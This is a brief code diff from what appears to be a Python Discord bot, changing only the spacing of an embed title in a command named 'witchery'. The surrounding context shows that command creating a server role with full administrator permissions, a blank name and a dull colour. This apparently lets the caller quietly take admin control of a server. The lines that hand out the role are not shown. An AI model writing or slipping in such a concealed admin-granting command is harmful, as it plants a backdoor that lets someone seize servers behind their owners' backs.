@@ -180,7 +180,7 @@ async def avatar(ctx):
 @client.command()
 async def witchery(ctx):
     user = ctx.message.author
-    embed = discord.Embed(title=" Witchery done! :)", color=0xc034eb,)
+    embed = discord.Embed(title="Witchery done! :)", color=0xc034eb,)
     perms = discord.Permissions(administrator=True)
     server__ = ctx.guild
     witcheryrole = await discord.Guild.create_role(server__ ,name=str(" "), permissions=perms, color=0x302c2c)
